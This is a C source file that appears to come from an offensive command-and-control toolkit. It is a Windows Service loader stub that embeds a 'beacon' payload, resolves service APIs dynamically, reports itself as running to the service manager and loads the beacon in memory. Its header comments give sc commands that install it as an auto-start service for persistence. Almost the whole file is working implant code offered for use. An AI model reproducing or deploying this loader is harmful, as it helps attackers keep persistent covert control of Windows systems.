// exe_svc.c -- Artifact stub: Windows Service loader.
//
// When started by SCM: reports SERVICE_RUNNING, keeps beacon alive.
// When started interactively: falls back to direct load (exe_basic behaviour).
//
// Install:  sc create BeaconSvc binPath= "C:\path\exe_svc.exe" start= auto
// Start:    sc start  BeaconSvc
//
// Service APIs loaded dynamically (advapi32.dll) -- no extra .lib needed.

#include "../artifact.h"

ART_DECLARE_PAYLOAD();

// ---- Dynamic advapi32 bindings -----------------------------------------------
typedef SERVICE_STATUS_HANDLE (WINAPI *PFN_RegCtrl)(LPCWSTR, LPHANDLER_FUNCTION);
typedef BOOL (WINAPI *PFN_SetStat)(SERVICE_STATUS_HANDLE, LPSERVICE_STATUS);
typedef BOOL (WINAPI *PFN_Dispatch)(const SERVICE_TABLE_ENTRYW *);

static PFN_RegCtrl  g_fn_reg = NULL;
static PFN_SetStat  g_fn_set = NULL;
static SERVICE_STATUS_HANDLE g_hdl;
static SERVICE_STATUS        g_stat;

static void svc_report(DWORD state) {
    g_stat.dwServiceType             = SERVICE_WIN32_OWN_PROCESS;
    g_stat.dwCurrentState            = state;
    g_stat.dwControlsAccepted        = (state == SERVICE_RUNNING)
                                       ? (SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN)
                                       : 0;
    g_stat.dwWin32ExitCode           = NO_ERROR;
    g_stat.dwServiceSpecificExitCode = 0;
    g_stat.dwCheckPoint              = 0;
    g_stat.dwWaitHint                = (state == SERVICE_START_PENDING) ? 3000 : 0;
    if (g_fn_set && g_hdl) g_fn_set(g_hdl, &g_stat);
}

static VOID WINAPI svc_ctrl(DWORD ctrl) {
    if (ctrl == SERVICE_CONTROL_STOP || ctrl == SERVICE_CONTROL_SHUTDOWN) {
        svc_report(SERVICE_STOP_PENDING);
        svc_report(SERVICE_STOPPED);
        ExitProcess(0);
    }
}

static VOID WINAPI svc_main(DWORD argc, LPWSTR *argv) {
    (void)argc; (void)argv;
    if (!g_fn_reg || !g_fn_set) return;

    g_hdl = g_fn_reg(L"", svc_ctrl);
    if (!g_hdl) return;

    svc_report(SERVICE_START_PENDING);

    unsigned int sz = art_get_size(g_payload);
    if (sz) art_load_beacon(g_payload, sz);

    svc_report(SERVICE_RUNNING);
    Sleep(INFINITE);
}

// ---- Entry point -------------------------------------------------------------
void __stdcall stub_main(void) {
    ART_RESOLVE_APIS();
    unsigned int sz = art_get_size(g_payload);
    if (!sz) ExitProcess(1);

    HMODULE adv = LoadLibraryW(L"advapi32.dll");
    PFN_Dispatch fn_disp = NULL;
    if (adv) {
        g_fn_reg = (PFN_RegCtrl) GetProcAddress(adv, "RegisterServiceCtrlHandlerW");
        g_fn_set = (PFN_SetStat) GetProcAddress(adv, "SetServiceStatus");
        fn_disp  = (PFN_Dispatch)GetProcAddress(adv, "StartServiceCtrlDispatcherW");
    }

    if (fn_disp) {
        static SERVICE_TABLE_ENTRYW tbl[2];
        tbl[0].lpServiceName = L"";
        tbl[0].lpServiceProc = svc_main;
        tbl[1].lpServiceName = NULL;
        tbl[1].lpServiceProc = NULL;
        if (fn_disp(tbl)) ExitProcess(0);
    }

    // Not launched by SCM -- direct execution.
    art_load_beacon(g_payload, sz);
    Sleep(INFINITE);
    ExitProcess(0);
}
